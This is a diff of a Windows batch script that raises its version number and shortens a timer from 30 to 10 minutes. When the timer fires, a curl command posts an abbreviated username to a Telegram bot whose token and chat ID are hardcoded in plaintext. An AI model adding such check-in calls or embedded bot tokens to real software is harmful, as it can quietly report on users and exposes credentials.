@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=26.2"
+set "BATCHVERSION=26.3"
 
 
 
@@ -1681,13 +1681,13 @@ echo MINTSS=%MINTSS%
 echo.
 echo.
 
-:: Check if 30 minutes have passed
-if %MINTSS% GEQ 30 goto 30MINDONE
+:: Check if 10 minutes have passed
+if %MINTSS% GEQ 10 goto 30MINDONE
 goto 30MINSTILL
 
 :30MINDONE
 set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%30ZIN"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%10ZIN"
 echo 0 > "%EVERY30MIN%"
 goto HIHOZ
 
